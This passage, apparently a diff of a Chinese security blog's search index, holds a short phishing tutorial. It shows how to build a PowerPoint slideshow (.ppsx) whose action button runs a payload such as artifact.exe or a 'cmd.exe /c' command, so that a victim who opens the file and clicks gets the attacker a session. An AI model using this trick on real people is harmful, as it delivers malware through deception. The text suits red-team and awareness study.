 <h5 id="后台查看输入数据"><a href="#后台查看输入数据" class="headerlink" title="后台查看输入数据"></a>后台查看输入数据</h5><p><img src="/images/1666077130046-980104fe-15a4-47b0-a492-1ac188c27526.png"></p>
+]]></content>
+      <categories>
+        <category>社工</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>PPT动作按钮特性构造PPSX钓鱼</title>
+    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/PPT%E5%8A%A8%E4%BD%9C%E6%8C%89%E9%92%AE%E7%89%B9%E6%80%A7%E6%9E%84%E9%80%A0PPSX%E9%92%93%E9%B1%BC/</url>
+    <content><![CDATA[<p><img src="/images/1665304303218-ef69de94-1746-431c-8a9d-ff7f16229031.png"></p>
+<p><img src="/images/1665305130335-538ccd82-f42b-4f1c-b9c2-2a7fb80997da.png"></p>
+<h5 id="插入–-gt-形状–-gt-工作按钮"><a href="#插入–-gt-形状–-gt-工作按钮" class="headerlink" title="插入–&gt;形状–&gt;工作按钮"></a>插入–&gt;形状–&gt;工作按钮</h5><p><img src="/images/1665304639254-4aa15653-b4fc-4a83-8116-a26f995d6f99.png"></p>
+<h5 id="设置运行程序"><a href="#设置运行程序" class="headerlink" title="设置运行程序"></a>设置运行程序</h5><p><img src="/images/1665307255297-ce6c0fb3-d612-42d9-b39d-0071b65b6da7.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\Desktop\artifact.exe</span><br></pre></td></tr></table></figure>
+
+<h5 id="然后重命名为-ppsx后缀"><a href="#然后重命名为-ppsx后缀" class="headerlink" title="然后重命名为.ppsx后缀"></a>然后重命名为.ppsx后缀</h5><p>注意，如果是用cmd.exe &#x2F;c执行命令，这里不要选择另存为，否则不会执行后续的命令参数</p>
+<p>如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\cmd.exe /c calc</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1665307356374-b673f326-a96d-4f18-a2a6-0bed861fc4e1.png"></p>
+<h5 id="双击打开文件，点击按钮即上线"><a href="#双击打开文件，点击按钮即上线" class="headerlink" title="双击打开文件，点击按钮即上线"></a>双击打开文件，点击按钮即上线</h5><p><img src="/images/1665307383696-0f018531-0e2f-4c7f-9a5f-ffe9001c0c95.png"></p>
+<p>该利用方式同时适用于wps</p>
 ]]></content>
       <categories>
         <category>社工</category>
